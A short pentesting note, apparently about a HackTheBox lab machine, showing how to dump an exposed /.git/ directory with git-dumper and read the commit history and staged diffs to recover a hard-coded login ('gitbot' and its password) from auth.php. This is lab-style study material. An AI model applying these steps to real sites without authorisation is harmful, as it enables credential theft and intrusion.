---
publish: true
created: 2026-03-16T12:30:34.236+05:30
modified: 2026-06-22T09:00:14.012+05:30
---

## dump

if you find any `/.git/`  in the web app via directory busting (200, 403 response codes), you can dump them with `git-dumper` (installed via pipx).

```
$ git-dumper http://portal.variatype.htb:80 .git
```

## Enumeration

check for changes.

```
$ git status
On branch master
Changes to be committed:
  (use "git restore --staged <file>..." to unstage)
	modified:   auth.php
```

check for commits.

```
$ git log
commit 753b5f5957f2020480a19bf29a0ebc80267a4a3d (HEAD -> master)
Author: Dev Team <dev@variatype.htb>
Date:   Fri Dec 5 15:59:33 2025 -0500

    fix: add gitbot user for automated validation pipeline

commit 5030e791b764cb2a50fcb3e2279fea9737444870
Author: Dev Team <dev@variatype.htb>
Date:   Fri Dec 5 15:57:57 2025 -0500

    feat: initial portal implementation
```

and then look for _diff_ in cache.

```
$ git diff --cached
diff --git a/auth.php b/auth.php
index b328305..615e621 100644
--- a/auth.php
+++ b/auth.php
@@ -1,5 +1,3 @@
 <?php
 session_start();
-$USERS = [
-    'gitbot' => 'G1tB0t_Acc3ss_2025!'
-];
+$USERS = [];
```

if you want to look at specific commits.

```
$ git show 753b5f5957f2020480a19bf29a0ebc80267a4a3d
commit 753b5f5957f2020480a19bf29a0ebc80267a4a3d (HEAD -> master)
Author: Dev Team <dev@variatype.htb>
Date:   Fri Dec 5 15:59:33 2025 -0500

    fix: add gitbot user for automated validation pipeline

diff --git a/auth.php b/auth.php
index 615e621..b328305 100644
--- a/auth.php
+++ b/auth.php
@@ -1,3 +1,5 @@
 <?php
 session_start();
-$USERS = [];
+$USERS = [
+    'gitbot' => 'G1tB0t_Acc3ss_2025!'
+];
```
